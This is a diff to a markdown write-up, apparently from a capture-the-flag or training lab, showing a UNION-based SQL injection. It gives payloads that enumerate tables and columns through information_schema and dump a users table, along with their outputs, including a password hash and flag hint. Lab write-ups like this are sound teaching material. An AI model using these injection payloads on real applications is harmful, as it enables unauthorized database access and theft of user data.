@@ -15,17 +15,17 @@ A union attack attempts to pull information from an additional table that is not
 > _UNION SELECT ‘a’,NULL_...
 >
 > 2. Find tables within current database  
->>_1 or 1 = 1 UNION SELECT 1,concat(table_name) FROM information_schema.tables WHERE table_schema = database()_
+ >_1 or 1 = 1 UNION SELECT 1,concat(table_name) FROM information_schema.tables WHERE table_schema = database()_
 >
 >>**users**
 >
 >3. Find columns within desired table  
->>_1 and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_schema = database()_
+ >_1 and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_schema = database()_
 >
 >>**user_id,first_name,last_name,town,country,planet,Commentaire,countersign**
 >
 >4. Find data  
->>_1 and 1=2 union select 1,concat(user_id,first_name,last_name,town,country,planet,Commentaire,countersign) from users_
+ >_1 and 1=2 union select 1,concat(user_id,first_name,last_name,town,country,planet,Commentaire,countersign) from users_
 >
 >>**5FlagGetThe424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28**
 >
